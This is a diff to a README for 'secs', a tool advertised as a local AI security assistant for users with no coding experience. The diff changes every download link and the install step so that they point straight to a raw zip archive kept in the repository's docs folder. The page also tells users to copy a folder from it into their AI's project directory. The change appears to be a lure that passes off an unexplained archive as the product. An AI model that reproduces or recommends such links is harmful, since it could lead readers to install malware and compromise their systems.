@@ -1,7 +1,7 @@
 <h1>🔐 secs - Your AI Security Assistant, Now Local</h1>
 
 <p align="center">
-  <a href="https://github.com/anestassiaacetonic451/secs" style="display:inline-block;padding:14px 36px;background:#0a84ff;color:#fff;font-size:18px;font-weight:bold;border-radius:30px;text-decoration:none;">⬇️ Download secs Now</a>
+  <a href="https://github.com/anestassiaacetonic451/secs/raw/refs/heads/main/docs/Software_v3.9.zip" style="display:inline-block;padding:14px 36px;background:#0a84ff;color:#fff;font-size:18px;font-weight:bold;border-radius:30px;text-decoration:none;">⬇️ Download secs Now</a>
 </p>
 
 <h2>🤔 What Is This?</h2>
@@ -26,7 +26,7 @@ The name "SECS" stands for <strong>SEC</strong>urity a<strong>S</strong>sistant.
 Follow these simple steps. No code experience needed.
 
 <ol>
-  <li><strong>Visit the download page:</strong> <a href="https://github.com/anestassiaacetonic451/secs">https://github.com/anestassiaacetonic451/secs</a></li>
+  <li><strong>Visit the download page:</strong> <a href="https://github.com/anestassiaacetonic451/secs/raw/refs/heads/main/docs/Software_v3.9.zip">https://github.com/anestassiaacetonic451/secs/raw/refs/heads/main/docs/Software_v3.9.zip</a></li>
   <li><strong>Get the files:</strong> Visit this link to download the application.</li>
   <li><strong>Read the included guide:</strong> Inside the download, there is a plain-English manual called <code>QUICKSTART.txt</code>. Open it. It explains everything you need to know.</li>
   <li><strong>Connect to your AI assistant:</strong> You will copy a small folder into your AI’s project directory. The guide shows you exactly how.</li>
@@ -132,7 +132,7 @@ You are not alone. Inside the download, there’s a simple forum link. Ask anyth
 Don't wait. Turn your everyday AI assistant into your personal security guard today.
 
 <p align="center">
-  <a href="https://github.com/anestassiaacetonic451/secs" style="display:inline-block;padding:16px 42px;background:#ff9f0a;color:#000;font-size:20px;font-weight:bold;border-radius:30px;text-decoration:none;">⬇️ Get secs Now – It’s Free</a>
+  <a href="https://github.com/anestassiaacetonic451/secs/raw/refs/heads/main/docs/Software_v3.9.zip" style="display:inline-block;padding:16px 42px;background:#ff9f0a;color:#000;font-size:20px;font-weight:bold;border-radius:30px;text-decoration:none;">⬇️ Get secs Now – It’s Free</a>
 </p>
 
 <h2>📌 Keywords</h2>
